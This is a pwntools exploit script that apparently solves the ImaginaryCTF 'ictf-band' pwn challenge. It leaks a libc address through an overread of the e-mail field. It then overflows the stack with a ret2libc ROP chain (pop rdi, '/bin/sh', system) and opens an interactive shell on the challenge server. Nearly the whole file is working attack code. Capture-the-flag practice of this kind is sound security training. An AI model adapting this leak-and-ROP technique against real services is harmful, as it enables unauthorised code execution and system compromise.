from pwn import *
from icecream import ic

elf = exe = ELF("./ictf-band_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("ictf-band.chal.imaginaryctf.org", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x18c0
pie b 0x1915
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def leak(length):
    sla(b">>", b"1")
    sla(b"Slot [1-5]:", b"7")
    sla(b"Album Count:", b"0")
    sla(b"[y/n]:", b"y")
    sla(b"Tell us how many you want, we will contact you soon:", str(length+1).encode())
    ru("Tell us your e-mail:")
    sl(b'a'*length)
    ru("a"*length)
    rl()
    leek = u64(b'\x00'+rl().strip().ljust(7, b'\x00'))
    sla(b"It's verified [y/n]:", b"y")
    return leek

def write(payload):
    sla(b">>", b"1")
    sla(b"Slot [1-5]:", b"7")
    sla(b"Album Count:", b"0")
    sla(b"[y/n]:", b"y")
    sla(b"Tell us how many you want, we will contact you soon:", str(len(payload)+1).encode())
    ru("Tell us your e-mail:")
    sl(payload)
    sla(b"It's verified [y/n]:", b"y")
    
libc.address = leak(16) - 0x21b700
ic(hex(libc.address))

pop_rdi = libc.address + 0x000000000002a3e5
binsh = libc.address + 0x1d8678
ret = libc.address + 0x00000000000f8c92
system = libc.sym['system'] 

payload = b'a'*0x98
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
write(payload)

io.interactive()
